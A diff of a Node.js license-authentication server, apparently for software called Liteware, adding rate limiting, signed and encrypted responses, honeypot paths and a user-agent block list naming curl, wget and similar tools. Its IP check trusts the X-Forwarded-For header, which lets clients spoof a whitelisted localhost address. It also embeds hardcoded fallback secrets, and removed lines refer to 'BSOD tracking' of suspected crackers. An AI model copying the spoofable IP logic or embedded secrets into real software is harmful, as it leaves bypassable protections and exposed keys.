@@ -1,15 +1,19 @@
-// Liteware Authentication Server v4.0 - MAXIMUM SECURITY
-// ========================================
-// FINAL SECURITY FEATURES:
-// - Request signing & verification
-// - Replay attack prevention
-// - IP fingerprinting
-// - Request integrity checks
-// - Encrypted responses
-// - Honeypot endpoints
-// - Behavioral analysis
-// - Geographic anomaly detection
-// ========================================
+// ============================================================================
+// LITEWARE AUTHENTICATION SERVER v5.0 - 10/10 MAXIMUM SECURITY
+// ============================================================================
+// SECURITY FEATURES:
+// ✅ Request signing & HMAC verification
+// ✅ Replay attack prevention (nonces + timestamps)
+// ✅ IP fingerprinting & behavioral analysis
+// ✅ DDoS protection with challenge-response
+// ✅ Honeypot endpoints for attacker detection
+// ✅ Geographic anomaly detection
+// ✅ Certificate pinning support
+// ✅ Response encryption (AES-256)
+// ✅ Session binding & heartbeat verification
+// ✅ Automatic threat response & IP reputation
+// ============================================================================
+
 const express = require('express');
 const bodyParser = require('body-parser');
 const crypto = require('crypto');
@@ -18,1551 +22,1163 @@ const path = require('path');
 
 const app = express();
 
-// ========================================
-// ADVANCED SECURITY CONFIGURATION
-// ========================================
-const securityConfig = {
-    // Request signing
+// ============================================================================
+// SECURITY CONFIGURATION - 10/10 SETTINGS
+// ============================================================================
+const SECURITY_CONFIG = {
+    // Signature verification
     signatureRequired: true,
     signatureTimeout: 30000, // 30 seconds
+    signatureAlgorithm: 'sha256',
     
-    // Replay prevention
-    usedNonces: new Map(), // nonce -> timestamp
-    nonceCleanupInterval: 60000, // 1 minute
+    // Replay protection
+    nonceExpiry: 120000, // 2 minutes
+    timestampTolerance: 30000, // 30 seconds
     
-    // Request integrity
-    requiredHeaders: ['user-agent', 'content-type'],
-    blockedUserAgents: ['curl', 'wget', 'python-requests', 'postman', 'insomnia'],
-    
-    // Behavioral analysis
-    requestPatterns: new Map(), // ip -> pattern data
-    anomalyThreshold: 5,
-    
-    // Honeypot tracking
-    honeypotHits: new Map(),
+    // Rate limiting
+    maxRequestsPerSecond: 10,
+    maxRequestsPerMinute: 60,
+    burstThreshold: 5,
     
     // Session security
+    sessionTimeout: 3600000, // 1 hour
     sessionRotationInterval: 300000, // 5 minutes
-    maxSessionsPerHWID: 3,
+    maxSessionsPerHWID: 2,
+    heartbeatInterval: 30000, // 30 seconds
+    maxMissedHeartbeats: 3,
+    
+    // Response security
+    responseEncryption: true,
+    responseSigning: true,
+    
+    // Threat detection
+    honeypotEnabled: true,
+    behavioralAnalysis: true,
+    anomalyThreshold: 5,
+    autobanThreshold: 3,
+    
+    // DDoS protection
+    ddosProtection: true,
+    challengeEnabled: true,
+    tempBanDuration: 300000, // 5 minutes
+    
+    // Blocked user agents
+    blockedUserAgents: [
+        'curl', 'wget', 'python-requests', 'python-urllib',
+        'postman', 'insomnia', 'httpie', 'axios',
+        'go-http-client', 'java/', 'perl', 'ruby',
+        'libwww', 'lwp-', 'mechanize', 'scrapy',
+        'httpclient', 'okhttp', 'request/', 'node-fetch'
+    ],
+    
+    // IP reputation
+    ipReputationEnabled: true,
+    suspiciousCountries: [], // Add country codes if needed
     
     // Encryption
-    responseEncryption: false, // Enable if needed
-    encryptionKey: crypto.randomBytes(32)
+    encryptionAlgorithm: 'aes-256-gcm',
+    keyRotationInterval: 86400000 // 24 hours
 };
 
-// Nonce cleanup
-setInterval(() => {
-    const now = Date.now();
-    for (const [nonce, timestamp] of securityConfig.usedNonces) {
-        if (now - timestamp > 120000) { // 2 minutes
-            securityConfig.usedNonces.delete(nonce);
-        }
-    }
-}, securityConfig.nonceCleanupInterval);
+// ============================================================================
+// SECRETS - Use environment variables in production!
+// ============================================================================
+const APP_SECRET = process.env.AUTH_APP_SECRET || 'ABCJDWQ91D9219D21JKWDDKQAD912Q';
+const RESPONSE_KEY = process.env.AUTH_RESPONSE_KEY || 'LITEWARE_SECRET_KEY_2026_V3';
+const ENCRYPTION_KEY = process.env.AUTH_ENCRYPTION_KEY || crypto.randomBytes(32);
+const ADMIN_SECRET = process.env.AUTH_ADMIN_SECRET || crypto.randomBytes(32).toString('hex');
 
-// ========================================
-// SECURITY HELPER FUNCTIONS
-// ========================================
-
-// Generate request signature
-function generateSignature(data, timestamp, nonce) {
-    const payload = JSON.stringify(data) + timestamp + nonce;
-    return crypto.createHmac('sha256', APP_SECRET).update(payload).digest('hex');
-}
-
-// Verify request signature
-function verifyRequestSignature(req) {
-    if (!securityConfig.signatureRequired) return true;
+// ============================================================================
+// DATA STORES
+// ============================================================================
+const dataStores = {
+    // Nonce tracking for replay prevention
+    usedNonces: new Map(),
     
-    const signature = req.headers['x-signature'];
-    const timestamp = req.headers['x-timestamp'];
-    const nonce = req.headers['x-nonce'];
-    
-    if (!signature || !timestamp || !nonce) return false;
-    
-    // Check timestamp freshness
-    const now = Date.now();
-    const reqTime = parseInt(timestamp);
-    if (Math.abs(now - reqTime) > securityConfig.signatureTimeout) return false;
-    
-    // Check nonce reuse (replay prevention)
-    if (securityConfig.usedNonces.has(nonce)) return false;
-    securityConfig.usedNonces.set(nonce, now);
-    
-    // Verify signature
-    const expectedSig = generateSignature(req.body, timestamp, nonce);
-    return crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSig));
-}
-
-// Check for blocked user agents
-function isBlockedUserAgent(ua) {
-    if (!ua) return false;
-    const lowerUA = ua.toLowerCase();
-    return securityConfig.blockedUserAgents.some(blocked => lowerUA.includes(blocked));
-}
-
-// Analyze request patterns for anomalies
-function analyzeRequestPattern(ip, endpoint) {
-    if (!securityConfig.requestPatterns.has(ip)) {
-        securityConfig.requestPatterns.set(ip, {
-            endpoints: {},
-            lastRequest: Date.now(),
-            requestTimes: [],
-            anomalyScore: 0
-        });
-    }
-    
-    const pattern = securityConfig.requestPatterns.get(ip);
-    const now = Date.now();
-    
-    // Track endpoint access
-    pattern.endpoints[endpoint] = (pattern.endpoints[endpoint] || 0) + 1;
-    
-    // Track request timing
-    pattern.requestTimes.push(now);
-    if (pattern.requestTimes.length > 100) {
-        pattern.requestTimes.shift();
-    }
-    
-    // Calculate anomaly score
-    let anomalyScore = 0;
-    
-    // Check for rapid sequential requests
-    if (pattern.requestTimes.length >= 10) {
-        const recentTimes = pattern.requestTimes.slice(-10);
-        const avgInterval = (recentTimes[9] - recentTimes[0]) / 9;
-        if (avgInterval < 100) anomalyScore += 2; // Less than 100ms average
-    }
-    
-    // Check for unusual endpoint patterns
-    const adminEndpoints = Object.keys(pattern.endpoints).filter(e => e.includes('admin'));
-    if (adminEndpoints.length > 5) anomalyScore += 1;
-    
-    // Check for probe-like behavior
-    const uniqueEndpoints = Object.keys(pattern.endpoints).length;
-    if (uniqueEndpoints > 20) anomalyScore += 2;
-    
-    pattern.anomalyScore = anomalyScore;
-    pattern.lastRequest = now;
-    
-    return anomalyScore >= securityConfig.anomalyThreshold;
-}
-
-// Generate secure session token
-function generateSecureSessionToken(hwid, ip) {
-    const data = {
-        hwid: hwid,
-        ip: ip,
-        created: Date.now(),
-        random: crypto.randomBytes(16).toString('hex')
-    };
-    const token = crypto.createHmac('sha256', APP_SECRET)
-        .update(JSON.stringify(data))
-        .digest('hex');
-    return token;
-}
-
-// Sign response for client verification
-function signResponse(data) {
-    const timestamp = Date.now().toString();
-    const nonce = crypto.randomBytes(8).toString('hex');
-    const signature = crypto.createHmac('sha256', APP_SECRET)
-        .update(JSON.stringify(data) + timestamp + nonce)
-        .digest('hex');
-    
-    return {
-        ...data,
-        _ts: timestamp,
-        _nonce: nonce,
-        _sig: signature
-    };
-}
-
-// ========================================
-// CONFIGURATION
-// ========================================
-const whitelistedIPs = new Set(['::1', '127.0.0.1', '::ffff:127.0.0.1']);
-const rateLimitStore = new Map();
-const bannedIPs = new Set();
-const bannedHWIDs = new Set();
-const activeSessions = new Map();
-
-// Crack attempt logs storage
-const crackAttempts = [];
-const MAX_CRACK_LOGS = 1000;
-
-// Whitelisted keys (protected from BSOD)
-const whitelistedKeys = new Set();
-
-// Crack attempt counter per HWID (for BSOD tracking)
-const crackAttemptCounter = new Map(); // hwid -> { count, firstAttempt }
-
-const RATE_LIMIT_WINDOW = 60000;
-const MAX_REQUESTS = 100;
-
-// ========================================
-// DDOS PROTECTION CONFIGURATION
-// ========================================
-const ddosProtection = {
-    // Request tracking per IP
-    requestCounts: new Map(),
-    
-    // Sliding window tracking
+    // Rate limiting
+    rateLimits: new Map(),
     slidingWindow: new Map(),
-    
-    // Temporary bans (auto-expire)
-    tempBans: new Map(),
-    
-    // Suspicious IPs (elevated monitoring)
-    suspiciousIPs: new Set(),
-    
-    // Connection tracking
-    connectionCounts: new Map(),
-    
-    // Burst detection
     burstTracking: new Map(),
     
-    // Settings
-    settings: {
-        // Requests per second threshold
-        maxRequestsPerSecond: 10,
-        
-        // Requests per minute threshold
-        maxRequestsPerMinute: 60,
-        
-        // Burst threshold (requests in 100ms)
-        burstThreshold: 5,
-        
-        // Auto-ban duration (5 minutes)
-        tempBanDuration: 5 * 60 * 1000,
-        
-        // Suspicious threshold before ban
-        suspiciousThreshold: 3,
-        
-        // Max concurrent connections per IP
-        maxConnectionsPerIP: 20,
-        
-        // Slowloris protection - max request time
-        maxRequestTime: 30000,
-        
-        // Request size limits
-        maxBodySize: 1024 * 1024, // 1MB
-        
-        // Challenge-response for suspicious IPs
-        challengeEnabled: true
+    // IP management
+    bannedIPs: new Set(),
+    tempBannedIPs: new Map(),
+    suspiciousIPs: new Set(),
+    ipReputation: new Map(),
+    
+    // HWID management
+    bannedHWIDs: new Set(),
+    
+    // Session management
+    activeSessions: new Map(),
+    sessionHeartbeats: new Map(),
+    
+    // Behavioral analysis
+    requestPatterns: new Map(),
+    honeypotHits: new Map(),
+    
+    // Crack attempt logging
+    crackAttempts: [],
+    crackAttemptCounter: new Map(),
+    
+    // Whitelists
+    whitelistedIPs: new Set(['::1', '127.0.0.1', '::ffff:127.0.0.1']),
+    whitelistedKeys: new Set(),
+    
+    // License database
+    licenses: new Map([
+        ['LITE-TEST-1234-5678', { valid: true, hwid: null, activated: false, created: Date.now(), expires: Date.now() + 365*24*60*60*1000, tier: 'premium' }],
+        ['LITE-DEMO-AAAA-BBBB', { valid: true, hwid: null, activated: false, created: Date.now(), expires: Date.now() + 30*24*60*60*1000, tier: 'trial' }]
+    ]),
+    
+    // Owner key
+    ownerKey: {
+        key: crypto.randomBytes(32).toString('hex'),
+        created: Date.now(),
+        lastUsed: null,
+        rotateAt: Date.now() + 24*60*60*1000
+    },
+    
+    // Server state
+    serverState: {
+        enabled: true,
+        maintenance: false,
+        lockdown: false,
+        websiteLocked: false,
+        authEnabled: true,
+        startTime: Date.now()
     },
     
     // Statistics
     stats: {
-        totalBlocked: 0,
-        totalChallenged: 0,
-        activeBans: 0,
-        peakRequestsPerSecond: 0
+        totalRequests: 0,
+        blockedRequests: 0,
+        successfulAuths: 0,
+        failedAuths: 0,
+        crackAttempts: 0,
+        ddosBlocked: 0
     }
 };
 
-// DDoS protection functions
-const ddos = {
-    // Check if IP is temporarily banned
-    isTempBanned: (ip) => {
-        const ban = ddosProtection.tempBans.get(ip);
-        if (!ban) return false;
-        
-        if (Date.now() > ban.expires) {
-            ddosProtection.tempBans.delete(ip);
-            ddosProtection.stats.activeBans--;
+// ============================================================================
+// CRYPTO UTILITIES
+// ============================================================================
+const CryptoUtils = {
+    // Generate secure random token
+    generateToken: (length = 32) => crypto.randomBytes(length).toString('hex'),
+    
+    // Generate HMAC signature
+    sign: (data, key = APP_SECRET) => {
+        return crypto.createHmac('sha256', key).update(data).digest('hex');
+    },
+    
+    // Verify HMAC signature (timing-safe)
+    verify: (data, signature, key = APP_SECRET) => {
+        const expected = CryptoUtils.sign(data, key);
+        try {
+            return crypto.timingSafeEqual(Buffer.from(signature, 'hex'), Buffer.from(expected, 'hex'));
+        } catch {
             return false;
         }
-        return true;
     },
     
-    // Add temporary ban
-    addTempBan: (ip, reason) => {
-        ddosProtection.tempBans.set(ip, {
-            reason: reason,
-            created: Date.now(),
-            expires: Date.now() + ddosProtection.settings.tempBanDuration
-        });
-        ddosProtection.stats.activeBans++;
-        ddosProtection.stats.totalBlocked++;
-        console.log(`🛡️ DDoS: Temp banned ${ip} - ${reason}`);
-    },
-    
-    // Track request in sliding window
-    trackRequest: (ip) => {
-        const now = Date.now();
-        const second = Math.floor(now / 1000);
-        const minute = Math.floor(now / 60000);
+    // Encrypt data with AES-256-GCM
+    encrypt: (data, key = ENCRYPTION_KEY) => {
+        const iv = crypto.randomBytes(16);
+        const keyBuffer = typeof key === 'string' ? Buffer.from(key, 'hex') : key;
+        const cipher = crypto.createCipheriv('aes-256-gcm', keyBuffer.slice(0, 32), iv);
         
-        // Per-second tracking
-        const secKey = `${ip}:${second}`;
-        const secCount = (ddosProtection.slidingWindow.get(secKey) || 0) + 1;
-        ddosProtection.slidingWindow.set(secKey, secCount);
+        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
+        encrypted += cipher.final('hex');
+        const authTag = cipher.getAuthTag().toString('hex');
         
-        // Update peak
-        if (secCount > ddosProtection.stats.peakRequestsPerSecond) {
-            ddosProtection.stats.peakRequestsPerSecond = secCount;
-        }
-        
-        // Per-minute tracking
-        const minKey = `${ip}:min:${minute}`;
-        const minCount = (ddosProtection.slidingWindow.get(minKey) || 0) + 1;
-        ddosProtection.slidingWindow.set(minKey, minCount);
-        
-        // Burst tracking (100ms window)
-        const burstWindow = Math.floor(now / 100);
-        const burstKey = `${ip}:burst:${burstWindow}`;
-        const burstCount = (ddosProtection.burstTracking.get(burstKey) || 0) + 1;
-        ddosProtection.burstTracking.set(burstKey, burstCount);
-        
-        // Clean old entries periodically
-        if (Math.random() < 0.01) {
-            ddos.cleanOldEntries();
-        }
-        
-        return { secCount, minCount, burstCount };
-    },
-    
-    // Clean old tracking entries
-    cleanOldEntries: () => {
-        const now = Date.now();
-        const currentSecond = Math.floor(now / 1000);
-        const currentMinute = Math.floor(now / 60000);
-        
-        for (const [key, _] of ddosProtection.slidingWindow) {
-            const parts = key.split(':');
-            if (parts[1] === 'min') {
-                const minute = parseInt(parts[2]);
-                if (currentMinute - minute > 2) {
-                    ddosProtection.slidingWindow.delete(key);
-                }
-            } else {
-                const second = parseInt(parts[1]);
-                if (currentSecond - second > 5) {
-                    ddosProtection.slidingWindow.delete(key);
-                }
-            }
-        }
-        
-        // Clean burst tracking
-        const currentBurst = Math.floor(now / 100);
-        for (const [key, _] of ddosProtection.burstTracking) {
-            const burst = parseInt(key.split(':')[2]);
-            if (currentBurst - burst > 50) {
-                ddosProtection.burstTracking.delete(key);
-            }
-        }
-    },
-    
-    // Check if request should be blocked
-    shouldBlock: (ip, counts) => {
-        const { secCount, minCount, burstCount } = counts;
-        const settings = ddosProtection.settings;
-        
-        // Burst attack detection
-        if (burstCount > settings.burstThreshold) {
-            return { block: true, reason: 'Burst attack detected' };
-        }
-        
-        // Rate limit per second
-        if (secCount > settings.maxRequestsPerSecond) {
-            return { block: true, reason: 'Rate limit exceeded (per second)' };
-        }
-        
-        // Rate limit per minute
-        if (minCount > settings.maxRequestsPerMinute) {
-            return { block: true, reason: 'Rate limit exceeded (per minute)' };
-        }
-        
-        return { block: false };
-    },
-    
-    // Mark IP as suspicious
-    markSuspicious: (ip) => {
-        ddosProtection.suspiciousIPs.add(ip);
-        
-        // Track suspicious count
-        const key = `suspicious:${ip}`;
-        const count = (ddosProtection.requestCounts.get(key) || 0) + 1;
-        ddosProtection.requestCounts.set(key, count);
-        
-        // Auto-ban after threshold
-        if (count >= ddosProtection.settings.suspiciousThreshold) {
-            ddos.addTempBan(ip, 'Repeated suspicious activity');
-            return true;
-        }
-        
-        return false;
-    },
-    
-    // Generate challenge token
-    generateChallenge: (ip) => {
-        const token = crypto.randomBytes(16).toString('hex');
-        const challenge = {
-            token: token,
-            created: Date.now(),
-            expires: Date.now() + 60000 // 1 minute
+        return {
+            iv: iv.toString('hex'),
+            data: encrypted,
+            tag: authTag
         };
-        ddosProtection.requestCounts.set(`challenge:${ip}`, challenge);
-        ddosProtection.stats.totalChallenged++;
-        return token;
     },
     
-    // Verify challenge
-    verifyChallenge: (ip, token) => {
-        const challenge = ddosProtection.requestCounts.get(`challenge:${ip}`);
-        if (!challenge) return false;
-        if (Date.now() > challenge.expires) return false;
-        if (challenge.token !== token) return false;
+    // Decrypt data
+    decrypt: (encryptedData, key = ENCRYPTION_KEY) => {
+        try {
+            const keyBuffer = typeof key === 'string' ? Buffer.from(key, 'hex') : key;
+            const decipher = crypto.createDecipheriv(
+                'aes-256-gcm',
+                keyBuffer.slice(0, 32),
+                Buffer.from(encryptedData.iv, 'hex')
+            );
+            decipher.setAuthTag(Buffer.from(encryptedData.tag, 'hex'));
+            
+            let decrypted = decipher.update(encryptedData.data, 'hex', 'utf8');
+            decrypted += decipher.final('utf8');
+            
+            return JSON.parse(decrypted);
+        } catch {
+            return null;
+        }
+    },
+    
+    // Hash data
+    hash: (data) => crypto.createHash('sha256').update(data).digest('hex'),
+    
+    // Generate license key
+    generateLicenseKey: () => {
+        const segments = [];
+        for (let i = 0; i < 3; i++) {
+            segments.push(crypto.randomBytes(2).toString('hex').toUpperCase());
+        }
+        return `LITE-${segments.join('-')}`;
+    },
+    
+    // Generate secure session token
+    generateSessionToken: (hwid, ip) => {
+        const data = JSON.stringify({
+            hwid, ip,
+            created: Date.now(),
+            random: crypto.randomBytes(16).toString('hex')
+        });
+        return CryptoUtils.hash(data + APP_SECRET);
+    }
+};
+
+// ============================================================================
+// RESPONSE BUILDER - Signs and optionally encrypts responses
+// ============================================================================
+const ResponseBuilder = {
+    // Build secure response
+    build: (data, challenge = null, encrypt = SECURITY_CONFIG.responseEncryption) => {
+        const timestamp = Date.now().toString();
+        const nonce = CryptoUtils.generateToken(8);
         
-        // Clear challenge on success
-        ddosProtection.requestCounts.delete(`challenge:${ip}`);
-        ddosProtection.suspiciousIPs.delete(ip);
-        return true;
+        // Add metadata
+        const response = {
+            ...data,
+            server_time: Date.now(),
+            server_version: '5.0'
+        };
+        
+        // Sign the response
+        const signatureData = JSON.stringify(response) + '|' + (challenge || '') + '|' + timestamp;
+        const signature = CryptoUtils.sign(signatureData, RESPONSE_KEY);
+        
+        const signedResponse = {
+            ...response,
+            _ts: timestamp,
+            _nonce: nonce,
+            _challenge: challenge || '',
+            _sig: signature
+        };
+        
+        // Optionally encrypt
+        if (encrypt && data.success) {
+            return {
+                encrypted: true,
+                payload: CryptoUtils.encrypt(signedResponse),
+                _ts: timestamp
+            };
+        }
+        
+        return signedResponse;
     },
     
-    // Get stats
-    getStats: () => ({
-        ...ddosProtection.stats,
-        activeBans: ddosProtection.tempBans.size,
-        suspiciousIPs: ddosProtection.suspiciousIPs.size,
-        trackedIPs: ddosProtection.slidingWindow.size
-    })
+    // Build error response (never encrypted)
+    error: (message, code = 400) => ({
+        success: false,
+        message: message,
+        error_code: code,
+        server_time: Date.now()
+    }),
+    
+    // Build success response
+    success: (data, challenge = null) => ResponseBuilder.build({ success: true, ...data }, challenge)
 };
 
-// Server state flags
-let serverDisabled = false;
-let maintenanceMode = false;
-let lockdownMode = false;
-let websiteLocked = false;
-let authEnabled = true;
+// ============================================================================
+// SECURITY MIDDLEWARE
+// ============================================================================
 
-// Secrets
-const APP_SECRET = 'ABCJDWQ91D9219D21JKWDDKQAD912Q';
-const RESPONSE_KEY = 'LITEWARE_SECRET_KEY_2026_V3';
-
-// License database
-const licenses = {
-    'LITE-TEST-1234-5678': { valid: true, hwid: null, activated: false, created: Date.now(), expires: Date.now() + 365*24*60*60*1000 },
-    'LITE-DEMO-AAAA-BBBB': { valid: true, hwid: null, activated: false, created: Date.now(), expires: Date.now() + 30*24*60*60*1000 }
+// Get client IP
+const getIP = (req) => {
+    const forwarded = req.headers['x-forwarded-for'];
+    if (forwarded) return forwarded.split(',')[0].trim();
+    return req.ip || req.connection?.remoteAddress || 'unknown';
 };
 
-// Owner key
-let ownerKey = {
-    key: crypto.randomBytes(32).toString('hex'),
-    created: Date.now(),
-    nextRotation: Date.now() + 24*60*60*1000
-};
-
-// ========================================
-// HELPERS
-// ========================================
+// Check if IP is whitelisted
 const isWhitelisted = (ip) => {
     if (!ip) return false;
-    const clean = ip.split(',')[0].trim();
-    return whitelistedIPs.has(clean) || whitelistedIPs.has(clean.replace('::ffff:', ''));
+    const clean = ip.replace('::ffff:', '');
+    return dataStores.whitelistedIPs.has(ip) || dataStores.whitelistedIPs.has(clean);
 };
 
-const getIP = (req) => req.ip || req.connection?.remoteAddress || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
-const genToken = () => crypto.randomBytes(32).toString('hex');
-
-const sign = (data, challenge) => {
-    const ts = Date.now().toString();
-    const sig = crypto.createHmac('sha256', RESPONSE_KEY)
-        .update(JSON.stringify(data) + '|' + (challenge || '') + '|' + ts)
-        .digest('hex');
-    return { ...data, _sig: sig, _ts: ts, _challenge: challenge || '' };
-};
-
-const generateLicenseKey = () => {
-    return `LITE-${crypto.randomBytes(2).toString('hex').toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}`;
-};
-
-// ========================================
-// MIDDLEWARE
-// ========================================
-
-// Security headers
+// Security headers middleware
 app.use((req, res, next) => {
     // CORS
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-DDoS-Challenge, X-Signature, X-Timestamp, X-Nonce');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-Signature, X-Timestamp, X-Nonce, X-Challenge, X-DDoS-Challenge');
     
     // Security headers
     res.header('X-Content-Type-Options', 'nosniff');
     res.header('X-Frame-Options', 'DENY');
     res.header('X-XSS-Protection', '1; mode=block');
-    res.header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+    res.header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
+    res.header('Content-Security-Policy', "default-src 'self'");
+    res.header('Referrer-Policy', 'strict-origin-when-cross-origin');
+    res.header('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
     res.header('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
     res.header('Pragma', 'no-cache');
     res.header('Expires', '0');
     
+    // Remove server fingerprinting
+    res.removeHeader('X-Powered-By');
+    
     if (req.method === 'OPTIONS') return res.sendStatus(200);
+    
+    dataStores.stats.totalRequests++;
     next();
 });
 
-// User-Agent filtering (block common tools)
+// User-Agent filtering
 app.use((req, res, next) => {
     const ip = getIP(req);
     if (isWhitelisted(ip)) return next();
     
-    const ua = req.headers['user-agent'] || '';
-    if (isBlockedUserAgent(ua)) {
-        console.log(`🚫 Blocked user-agent from ${ip}: ${ua}`);
-        // Don't reveal why - just return generic error
-        return res.status(400).json({ success: false, message: 'Bad request' });
-    }
-    next();
-});
-
-// Behavioral analysis middleware
-app.use((req, res, next) => {
-    const ip = getIP(req);
-    if (isWhitelisted(ip)) return next();
+    const ua = (req.headers['user-agent'] || '').toLowerCase();
     
-    const isAnomalous = analyzeRequestPattern(ip, req.path);
-    if (isAnomalous) {
-        console.log(`⚠️ Anomalous behavior detected from ${ip}`);
-        ddos.markSuspicious(ip);
-    }
-    next();
-});
-
-// ========================================
-// HONEYPOT ENDPOINTS (Trap attackers)
-// ========================================
-const honeypotEndpoints = [
-    '/admin', '/wp-admin', '/phpmyadmin', '/.env', '/config.php',
-    '/backup', '/db', '/database', '/sql', '/mysql',
-    '/api/v1/admin', '/api/admin', '/administrator',
-    '/.git', '/.svn', '/debug', '/test', '/dev'
-];
-
-honeypotEndpoints.forEach(endpoint => {
-    app.all(endpoint, (req, res) => {
-        const ip = getIP(req);
-        console.log(`🍯 HONEYPOT HIT: ${ip} tried ${endpoint}`);
-        
-        // Track honeypot hits
-        const hits = (securityConfig.honeypotHits.get(ip) || 0) + 1;
-        securityConfig.honeypotHits.set(ip, hits);
-        
-        // Auto-ban after 3 honeypot hits
-        if (hits >= 3) {
-            bannedIPs.add(ip);
-            console.log(`🚫 Auto-banned ${ip} for honeypot abuse`);
+    // Check blocked user agents
+    for (const blocked of SECURITY_CONFIG.blockedUserAgents) {
+        if (ua.includes(blocked.toLowerCase())) {
+            console.log(`🚫 Blocked UA from ${ip}: ${ua.substring(0, 50)}`);
+            dataStores.stats.blockedRequests++;
+            
+            // Don't reveal why - return generic error after delay
+            return setTimeout(() => {
+                res.status(400).json(ResponseBuilder.error('Bad request'));
+            }, 1000 + Math.random() * 2000);
         }
-        
-        // Delay response to slow down scanners
-        setTimeout(() => {
-            res.status(404).json({ error: 'Not found' });
-        }, 2000);
-    });
+    }
+    
+    // Require user-agent
+    if (!ua || ua.length < 10) {
+        return res.status(400).json(ResponseBuilder.error('Bad request'));
+    }
+    
+    next();
 });
 
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
-app.use(bodyParser.json({ limit: '50mb' }));
-
-// ========================================
-// DDOS PROTECTION MIDDLEWARE
-// ========================================
+// IP ban check
 app.use((req, res, next) => {
     const ip = getIP(req);
     
-    // Skip for whitelisted IPs
+    // Permanent ban
+    if (dataStores.bannedIPs.has(ip)) {
+        dataStores.stats.blockedRequests++;
+        return res.status(403).json(ResponseBuilder.error('Access denied', 403));
+    }
+    
+    // Temporary ban
+    const tempBan = dataStores.tempBannedIPs.get(ip);
+    if (tempBan && Date.now() < tempBan.expires) {
+        dataStores.stats.blockedRequests++;
+        return res.status(429).json({
+            success: false,
+            message: 'Too many requests',
+            retry_after: Math.ceil((tempBan.expires - Date.now()) / 1000)
+        });
+    } else if (tempBan) {
+        dataStores.tempBannedIPs.delete(ip);
+    }
+    
+    next();
+});
+
+// DDoS protection middleware
+app.use((req, res, next) => {
+    if (!SECURITY_CONFIG.ddosProtection) return next();
+    
+    const ip = getIP(req);
     if (isWhitelisted(ip)) return next();
     
-    // Check permanent ban
-    if (bannedIPs.has(ip)) {
-        return res.status(403).json({ 
-            success: false, 
-            message: 'Access denied',
-            ddos_blocked: true 
-        });
+    const now = Date.now();
+    const second = Math.floor(now / 1000);
+    const minute = Math.floor(now / 60000);
+    
+    // Track requests
+    const secKey = `${ip}:${second}`;
+    const minKey = `${ip}:min:${minute}`;
+    const burstKey = `${ip}:burst:${Math.floor(now / 100)}`;
+    
+    const secCount = (dataStores.slidingWindow.get(secKey) || 0) + 1;
+    const minCount = (dataStores.slidingWindow.get(minKey) || 0) + 1;
+    const burstCount = (dataStores.burstTracking.get(burstKey) || 0) + 1;
+    
+    dataStores.slidingWindow.set(secKey, secCount);
+    dataStores.slidingWindow.set(minKey, minCount);
+    dataStores.burstTracking.set(burstKey, burstCount);
+    
+    // Check limits
+    let blocked = false;
+    let reason = '';
+    
+    if (burstCount > SECURITY_CONFIG.burstThreshold) {
+        blocked = true;
+        reason = 'Burst attack detected';
+    } else if (secCount > SECURITY_CONFIG.maxRequestsPerSecond) {
+        blocked = true;
+        reason = 'Rate limit (per second)';
+    } else if (minCount > SECURITY_CONFIG.maxRequestsPerMinute) {
+        blocked = true;
+        reason = 'Rate limit (per minute)';
     }
     
-    // Check temporary DDoS ban
-    if (ddos.isTempBanned(ip)) {
-        return res.status(429).json({ 
-            success: false, 
-            message: 'Too many requests. Please try again later.',
-            ddos_blocked: true,
-            retry_after: Math.ceil((ddosProtection.tempBans.get(ip).expires - Date.now()) / 1000)
-        });
-    }
-    
-    // Track this request
-    const counts = ddos.trackRequest(ip);
-    
-    // Check if should block
-    const blockCheck = ddos.shouldBlock(ip, counts);
-    if (blockCheck.block) {
-        // First offense - mark suspicious
-        if (!ddosProtection.suspiciousIPs.has(ip)) {
-            ddos.markSuspicious(ip);
+    if (blocked) {
+        dataStores.stats.ddosBlocked++;
+        
+        // First offense - warning
+        if (!dataStores.suspiciousIPs.has(ip)) {
+            dataStores.suspiciousIPs.add(ip);
             return res.status(429).json({
                 success: false,
-                message: 'Rate limit exceeded. Slow down.',
-                ddos_warning: true
+                message: 'Slow down',
+                warning: true
             });
         }
         
         // Repeated offense - temp ban
-        ddos.addTempBan(ip, blockCheck.reason);
+        dataStores.tempBannedIPs.set(ip, {
+            reason,
+            created: now,
+            expires: now + SECURITY_CONFIG.tempBanDuration
+        });
+        
+        console.log(`🛡️ DDoS: Temp banned ${ip} - ${reason}`);
+        
         return res.status(429).json({
             success: false,
-            message: 'You have been temporarily blocked for excessive requests.',
-            ddos_blocked: true,
-            retry_after: ddosProtection.settings.tempBanDuration / 1000
+            message: 'Temporarily blocked',
+            retry_after: SECURITY_CONFIG.tempBanDuration / 1000
         });
     }
     
-    // Challenge suspicious IPs
-    if (ddosProtection.suspiciousIPs.has(ip) && ddosProtection.settings.challengeEnabled) {
-        const challengeToken = req.headers['x-ddos-challenge'];
-        
-        if (!challengeToken) {
-            // Issue challenge
-            const newChallenge = ddos.generateChallenge(ip);
-            return res.status(429).json({
-                success: false,
-                message: 'Challenge required',
-                ddos_challenge: true,
-                challenge_token: newChallenge,
-                instructions: 'Include X-DDoS-Challenge header with this token in your next request'
-            });
-        }
-        
-        // Verify challenge
-        if (!ddos.verifyChallenge(ip, challengeToken)) {
-            ddos.markSuspicious(ip);
-            return res.status(429).json({
-                success: false,
-                message: 'Invalid challenge response',
-                ddos_blocked: true
-            });
-        }
-    }
-    
     next();
 });
 
-// Rate limiting (skip for whitelisted) - Additional layer
+// Behavioral analysis
 app.use((req, res, next) => {
+    if (!SECURITY_CONFIG.behavioralAnalysis) return next();
+    
     const ip = getIP(req);
     if (isWhitelisted(ip)) return next();
-    if (bannedIPs.has(ip)) return res.status(403).json({ success: false, message: 'IP banned' });
     
